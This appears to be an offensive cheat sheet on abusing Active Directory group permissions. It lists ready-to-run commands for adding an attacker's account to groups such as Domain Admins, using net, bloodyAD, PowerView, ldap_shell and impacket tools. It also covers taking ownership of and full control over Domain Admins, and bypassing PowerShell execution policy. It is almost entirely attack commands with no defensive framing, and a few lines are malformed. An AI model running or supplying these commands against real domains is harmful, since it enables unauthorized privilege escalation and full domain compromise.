# ACLs/ACEs permissions on Group

### AddSelf (Self-Membership) on Group / GenericAll/WriteProperty on Group/ WriteProperty (Self-Membership)

#### 1) Add group member

    net group "GROUP" MY_USER /add /domain

#### 2) ldeep

    ldeep ldap -u USER -p PASSWORD -d DOMAIN -s ldap://DC add_to_group "CN=USER,DC=DOMAIN" "CN=GROUP,DC=DOMAIN"

#### 3) Linux Net RPC - Samba

    net rpc group addmem "GROUP" "USER" -U domain.local/USER%'Password@1' -S DC_IP

#### 4) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER" -p "Password@1" add groupMember "GROUP" "USER"

#### 5) Powerview

    powershell -ep bypass
    
    Import-Module .PowerView.ps1
    
    $SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force
    
    $Cred = New-Object
    
    System.Management.Automation.PSCredential('domain.local\USER1', $SecPassword)
    
    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'USER1' -Credential

    $Cred

#### 6) Ldap_shell

    ldap_shell domain.local/USER1:Password@1 -dc-ip DC_IP
    add_user_to_group USER1 "GROUP"

#### 7) Active Directory Module

    Get-Module -Name ActiveDirectory -ListAvailable
    Import-Module -Name ActiveDirectory
    Add-ADGroupMember -Identity 'GROUP' -Members 'USER1'

#### 8) Addusertogroup python script

Link: https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py

    python3 addusertogroup.py -d domain.local -g "GROUP" -a USER1 -u USER1 -p PASSWORD@1

### WriteOwner on Group

WriteDACL + WriteOwner. Give yourself Generic All with: owneredit.py and dacledit.py

#### 1) impacket-owneredit

Grant our user ownership of the Domain Admins group (example)

    impacket-owneredit -action write -new-owner 'USER1' -target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP

#### 2) impacket-dacledit

Grant our user Full Control of the Domain Admins group (example)

    impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'USER1' - target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP

#### 3) Linux Net RPC - Samba

    net rpc group addmem "Domain Admins" USER1 -U domain.local/USER1%'Password@1' -S DC_IP

#### 4) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" add groupMember "Domain Admins" "USER1"

#### 5) Powerview

Grant Ownership and Full Control

    powershell -ep bypass
    Import-Module .PowerView.ps1
    Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'USER1'
    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "USER1"

#### 6) Windows Net command

    net group "domain admins" USER1 /add /domain

